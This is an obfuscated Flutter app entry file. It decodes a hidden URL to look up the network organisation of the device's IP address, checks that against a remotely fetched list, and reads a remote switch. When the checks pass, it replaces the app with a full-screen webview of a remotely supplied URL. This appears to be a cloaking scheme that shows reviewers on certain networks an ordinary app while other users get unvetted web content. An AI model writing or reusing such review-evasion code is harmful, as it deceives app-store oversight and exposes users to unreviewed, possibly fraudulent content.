import 'dart:convert';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:rx_shared_preferences/rx_shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'main_screen.dart/const.dart';
import 'mainx.dart';
import 'splash_screen.dart';

final InAppReview inAppReview = InAppReview.instance;
String privacyPPl = '';
String hme = '';
int pom = 5;
List<String> nhhf = [];
List<bool> zasda = [true, true];
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  dsasadxa = sadasx(dsasadxa, -pom);
  await xasza();
  await aaax();
  await loadxz();
  final RxSharedPreferences prefs = RxSharedPreferences.getInstance();
  final bool? isxa = await prefs.getBool("isAuthed");
  final bool? isxx = await prefs.getBool("isAuthedx");
  runApp(
    MainApp(
      isAuthed: isxa ?? false,
      isPrivacy: isxx ?? false,
    ),
  );
}

final Dio dio = Dio();
Future<String> xasza() async {
  dio.options.headers['apikey'] = datax;
  dio.options.headers['Authorization'] = 'Bearer $datax';
  try {
    final Response response = await dio.get(fsdafa);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String themesFetch = data.map((item) => item['data1x'].toString()).join();

      if (themesFetch.contains(xvdfs)) {
        zasda[1] = false;
      } else {
        hme = themesFetch;
        zasda[1] = true;
      }
      return themesFetch;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<String> loadxz() async {
  try {
    http.Response response = await http.get(Uri.parse(dsasadxa));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String ddx = data['org'];
      contactx(nhhf, ddx);
      return ddx;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

bool contactx(List<String> array, String inputString) {
  List<String> words = inputString.split(' ');
  List<String> arrayItems = [];
  for (String item in array) {
    arrayItems.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String arrayItem in arrayItems) {
      if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
        zasda[0] = false;
        return false;
      } else {
        zasda[0] = true;
      }
    }
  }

  return false;
}

Future<List<String>> aaax() async {
  dio.options.headers['apikey'] = datax;
  dio.options.headers['Authorization'] = 'Bearer $datax';

  try {
    final Response response = await dio.get(dtatx1);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      nhhf = data.map((item) => item['datax'].toString()).toList();

      return nhhf;
    } else {
      return [];
    }
  } catch (error) {
    return [];
  }
}

Future<void> rateApp() async {
  if (await inAppReview.isAvailable()) {
    inAppReview.requestReview();
  }
}

String sadasx(String input, int shift) {
  StringBuffer result = StringBuffer();
  for (int i = 0; i < input.length; i++) {
    int charCode = input.codeUnitAt(i);
    if (charCode >= 65 && charCode <= 90) {
      charCode = (charCode - 65 + shift) % 26 + 65;
    } else if (charCode >= 97 && charCode <= 122) {
      charCode = (charCode - 97 + shift) % 26 + 97;
    }
    result.writeCharCode(charCode);
  }
  return result.toString();
}

Future<List<bool>> gggxa() async {
  if (zasda[0] && zasda[1]) {
    return Future.delayed(const Duration(seconds: 2), () => [true, true]);
  } else if (!zasda[0] && zasda[1]) {
    return Future.delayed(const Duration(seconds: 2), () => [false, true]);
  } else if (zasda[0] && !zasda[1]) {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  } else {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  }
}

class MainApp extends StatelessWidget {
  final bool isAuthed;
  final bool isPrivacy;
  const MainApp({
    super.key,
    required this.isAuthed,
    required this.isPrivacy,
  });

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<List<bool>>(
        future: gggxa(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              backgroundColor: Colors.white,
              body: Center(
                child: Container(
                    height: 80,
                    width: 80,
                    child: ClipRRect(
                      child: Image.asset('assets/images/x.png'),
                      borderRadius: BorderRadius.circular(20),
                    )),
              ),
            );
          } else {
            List<bool>? ixxz = snapshot.data;
            if (isPrivacy == false) {
              rateApp();

              return ShowPrivacyx(itaxz: ippxxp);
            } else if (isPrivacy == true && (!ixxz![0] || !ixxz[1])) {
              rateApp();

              return isAuthed == false
                  ? const SplashScreen()
                  : const MainxScreen();
            } else if (ixxz != null && ixxz[0] && ixxz[1]) {
              rateApp();

              return ShowPrivacyx(itaxz: hme);
            } else {
              rateApp();
              return isAuthed == false
                  ? const SplashScreen()
                  : const MainxScreen();
            }
          }
        },
      ),
    );
  }
}

class ShowPrivacyx extends StatelessWidget {
  final String itaxz;

  ShowPrivacyx({super.key, required this.itaxz});
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: itaxz == ippxxp
          ? AppBar(
              backgroundColor: const Color.fromARGB(255, 40, 39, 39),
              title: const Text('Privacy Policy'),
              actions: [
                InkWell(
                    onTap: () {
                      RxSharedPreferences.getInstance()
                          .setBool("isAuthedx", true);
                      Navigator.pushAndRemoveUntil<dynamic>(
                        context,
                        MaterialPageRoute<dynamic>(
                          builder: (BuildContext context) =>
                              const SplashScreen(),
                        ),
                        (route) => false,
                      );
                    },
                    child: const Text(
                      'Confirm',
                      style: TextStyle(color: Colors.green),
                    )),
              ],
            )
          : null,
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(itaxz),
          ),
        ),
      ),
    );
  }
}
